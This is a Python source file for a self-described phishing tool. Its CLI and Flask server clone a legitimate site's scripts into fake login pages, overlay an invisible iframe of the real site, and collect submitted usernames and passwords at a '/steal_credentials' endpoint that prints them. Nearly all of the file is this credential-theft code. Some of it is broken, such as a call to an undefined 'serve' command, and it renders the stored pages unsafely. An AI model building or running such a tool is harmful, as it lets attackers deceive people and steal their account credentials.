
banner = """
███████████  █████       ███          █████      ██████████                                  █████            
░░███░░░░░███░░███       ░░░          ░░███      ░░███░░░░███                                ░░███             
 ░███    ░███ ░███████   ████   █████  ░███████   ░███   ░░███  ██████  ████████  █████ ████ ███████    ██████ 
 ░██████████  ░███░░███ ░░███  ███░░   ░███░░███  ░███    ░███ ███░░███░░███░░███░░███ ░███ ░░░███░    ███░░███
 ░███░░░░░░   ░███ ░███  ░███ ░░█████  ░███ ░███  ░███    ░███░███████  ░███ ░███ ░███ ░███   ░███    ░███████ 
 ░███         ░███ ░███  ░███  ░░░░███ ░███ ░███  ░███    ███ ░███░░░   ░███ ░███ ░███ ░███   ░███ ███░███░░░  
 █████        ████ █████ █████ ██████  ████ █████ ██████████  ░░██████  ░███████  ░░████████  ░░█████ ░░██████ 
░░░░░        ░░░░ ░░░░░ ░░░░░ ░░░░░░  ░░░░ ░░░░░ ░░░░░░░░░░    ░░░░░░   ░███░░░    ░░░░░░░░    ░░░░░   ░░░░░░  
                                                                        ░███                                   
                                                                        █████                                  
                                                                       ░░░░░                                   
"""
print(banner)

import os
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from flask import Flask, request, redirect, render_template_string
import click

app = Flask(__name__)

# Directory to store phishing pages
PHISHING_PAGES_DIR = 'phishing_pages'

# Function to copy script content from a legitimate URL
def copy_page_script(url):
    response = requests.get(url)
    response.raise_for_status()

    soup = BeautifulSoup(response.content, 'html.parser')
    scripts = soup.find_all('script')

    script_content = ""
    for script in scripts:
        if script.string:
            script_content += script.string + "\n"
        elif script.get('src'):
            script_url = script.get('src')
            if not script_url.startswith('http'):
                script_url = urljoin(url, script_url)
            script_response = requests.get(script_url)
            script_response.raise_for_status()
            script_content += script_response.text + "\n"

    return script_content

# Function to generate phishing page HTML
def generate_phishing_page(legitimate_url, phishing_page_name):
    legitimate_scripts = copy_page_script(legitimate_url)

    phishing_page_html = f'''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>{phishing_page_name}</title>
        <style>
            iframe {{
                position: absolute;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                border: none;
                opacity: 0; /* Make it invisible */
            }}
        </style>
        <!-- Embedding legitimate scripts -->
        {legitimate_scripts}
    </head>
    <body>
        <h1>{phishing_page_name}</h1>
        <div class="login-container">
            <h2>Login Form</h2>
            <form action="/steal_credentials" method="post">
                <label for="username">Username:</label>
                <input type="text" id="username" name="username"><br><br>
                <label for="password">Password:</label>
                <input type="password" id="password" name="password"><br><br>
                <input type="submit" value="Login">
            </form>
        </div>

        <!-- Hidden iframe to load the legitimate site -->
        <iframe src="{legitimate_url}"></iframe>
    </body>
    </html>
    '''
    
    # Save phishing page to file
    phishing_page_path = os.path.join(PHISHING_PAGES_DIR, f'{phishing_page_name}.html')
    with open(phishing_page_path, 'w') as f:
        f.write(phishing_page_html)
    
    return phishing_page_path

# Function to list available phishing pages
def list_phishing_pages():
    phishing_pages = os.listdir(PHISHING_PAGES_DIR)
    return phishing_pages

# Function to delete a phishing page
def delete_phishing_page(phishing_page_name):
    phishing_page_path = os.path.join(PHISHING_PAGES_DIR, f'{phishing_page_name}.html')
    if os.path.exists(phishing_page_path):
        os.remove(phishing_page_path)
        return True
    return False

# Function to rename a phishing page
def rename_phishing_page(old_name, new_name):
    old_path = os.path.join(PHISHING_PAGES_DIR, f'{old_name}.html')
    new_path = os.path.join(PHISHING_PAGES_DIR, f'{new_name}.html')
    if os.path.exists(old_path):
        os.rename(old_path, new_path)
        return True
    return False

# Flask routes
@app.route('/')
def serve_phishing_page():
    page_name = request.args.get('page')
    if page_name:
        page_path = os.path.join(PHISHING_PAGES_DIR, f'{page_name}.html')
        if os.path.exists(page_path):
            with open(page_path, 'r') as file:
                return render_template_string(file.read())
    return "Phishing page not found", 404

@app.route('/steal_credentials', methods=['POST'])
def steal_credentials():
    username = request.form['username']
    password = request.form['password']
    print(f"Stolen credentials: Username - {username}, Password - {password}")
    return redirect(request.url)

# CLI commands using Click
@click.group()
def cli():
    if not os.path.exists(PHISHING_PAGES_DIR):
        os.makedirs(PHISHING_PAGES_DIR)

@cli.command()
@click.option('--url', prompt='Enter the legitimate URL', help='URL of the legitimate site to copy scripts from')
@click.option('--name', prompt='Enter the phishing page name', help='Name of the phishing page')
def create(url, name):
    """Create a new phishing page."""
    if os.path.exists(os.path.join(PHISHING_PAGES_DIR, f'{name}.html')):
        click.echo(f"Phishing page with name '{name}' already exists.")
        return
    phishing_page_file = generate_phishing_page(url, name)
    click.echo(f"Phishing page '{name}' created successfully: {phishing_page_file}")

@cli.command()
def list():
    """List all available phishing pages."""
    phishing_pages = list_phishing_pages()
    if phishing_pages:
        click.echo("Available phishing pages:")
        for index, page in enumerate(phishing_pages):
            click.echo(f"{index + 1}. {page.replace('.html', '')}")
    else:
        click.echo("No phishing pages found.")

@cli.command()
@click.argument('name')
def delete(name):
    """Delete a phishing page by name."""
    if delete_phishing_page(name):
        click.echo(f"Phishing page '{name}' deleted successfully.")
    else:
        click.echo(f"Phishing page '{name}' not found.")

@cli.command()
@click.argument('old_name')
@click.option('--new_name', prompt='Enter the new name', help='New name for the phishing page')
def rename(old_name, new_name):
    """Rename a phishing page."""
    if os.path.exists(os.path.join(PHISHING_PAGES_DIR, f'{new_name}.html')):
        click.echo(f"Phishing page with name '{new_name}' already exists.")
        return
    if rename_phishing_page(old_name, new_name):
        click.echo(f"Phishing page '{old_name}' renamed to '{new_name}' successfully.")
    else:
        click.echo(f"Phishing page '{old_name}' not found.")

@cli.command()
def start():
    """Start the phishing tool."""
    click.echo("Welcome to the phishing tool!")
    phishing_pages = list_phishing_pages()
    if phishing_pages:
        click.echo("Available phishing pages:")
        for index, page in enumerate(phishing_pages):
            click.echo(f"{index + 1}. {page.replace('.html', '')}")

    action = click.prompt("Do you want to (1) create a new phishing page, (2) choose an existing one, (3) delete an existing page, or (4) rename an existing page?", type=int)

    if action == 1:
        url = click.prompt('Enter the legitimate URL')
        name = click.prompt('Enter the phishing page name')
        create.invoke(None, url=url, name=name)
    elif action == 2:
        list.invoke(None)
        page_input = click.prompt('Enter the number or name of the phishing page you want to serve')
        try:
            page_index = int(page_input) - 1
            page = phishing_pages[page_index].replace('.html', '')
        except (ValueError, IndexError):
            page = page_input
        serve.invoke(None, page=page)
    elif action == 3:
        list.invoke(None)
        page_input = click.prompt('Enter the number or name of the phishing page you want to delete')
        try:
            page_index = int(page_input) - 1
            page = phishing_pages[page_index].replace('.html', '')
        except (ValueError, IndexError):
            page = page_input
        delete.invoke(None, name=page)
    elif action == 4:
        list.invoke(None)
        old_name_input = click.prompt('Enter the number or name of the phishing page you want to rename')
        try:
            page_index = int(old_name_input) - 1
            old_name = phishing_pages[page_index].replace('.html', '')
        except (ValueError, IndexError):
            old_name = old_name_input
        new_name = click.prompt('Enter the new name for the phishing page')
        rename.invoke(None, old_name=old_name, new_name=new_name)
    else:
        click.echo("Invalid choice. Exiting.")

if __name__ == '__main__':
    cli()
